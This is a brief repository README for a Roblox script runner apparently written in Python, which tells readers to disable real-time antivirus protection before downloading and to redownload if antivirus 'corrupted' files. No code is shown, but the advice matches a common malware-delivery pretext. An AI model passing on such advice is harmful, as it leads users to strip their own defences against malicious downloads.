# GYTHE-Solarav3
an updated Roblox script runner created with python
To download, you must disable real-time protection and development unit protection.
If you didn't disable that, you should delete what you downloaded and download it again so that no elements have been corrupted by the antivirus.
